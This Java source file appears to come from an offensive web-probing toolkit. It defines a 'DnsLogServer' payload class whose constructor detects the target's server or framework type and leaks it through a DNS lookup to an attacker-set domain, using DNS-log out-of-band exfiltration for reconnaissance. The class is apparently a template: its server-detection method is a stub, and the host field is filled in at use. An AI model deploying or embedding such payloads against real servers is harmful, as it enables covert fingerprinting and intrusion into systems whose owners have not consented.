package com.reajason.javaweb.probe.payload.dns;

import java.net.InetAddress;

/**
 * @author ReaJason
 * @since 2025/7/28
 */
public class DnsLogServer {
    public static String host;

    public DnsLogServer() {
        try {
            // 逗号不是合法域名字符，框架前缀拼接的类型（SpringWebMvc,Tomcat、Struts2,Tomcat）转成短横线保证可解析
            InetAddress.getAllByName("serverType." + getServer().toLowerCase().replace(",", "-") + "." + host);
        } catch (Throwable ignored) {
        }
    }

    private String getServer() {
        return null;
    }
}
